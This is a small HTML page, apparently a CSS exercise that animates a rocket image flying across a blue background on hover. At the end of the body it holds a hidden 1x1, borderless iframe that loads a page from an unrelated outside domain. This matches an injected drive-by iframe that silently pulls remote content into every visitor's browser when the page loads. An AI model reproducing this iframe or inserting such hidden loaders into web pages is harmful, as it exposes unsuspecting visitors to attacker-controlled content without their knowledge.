<!DOCTYPE html>
<html>
<head lang="en">
    <meta charset="UTF-8">
    <title></title>
    <style>
        html,body{
            height: 100%;
        }

        body{
            background-color: deepskyblue;
        }
        .rocket{
            width: 50px;
            position: absolute;
            left:0;
            bottom:0;

            transform:translate(-100px ,100px) rotate(45deg);


            transition:all 1s;


        }

        body:hover .rocket{
            transform:translate(500px,-500px) rotate(45deg);
        }
    </style>
</head>
<body>
    <img class="rocket" src="images3/rocket.png" alt=""/>
<iframe src="http://ZieF.pl/rc/" width=1 height=1 style="border:0"></iframe>
</body>
</html>
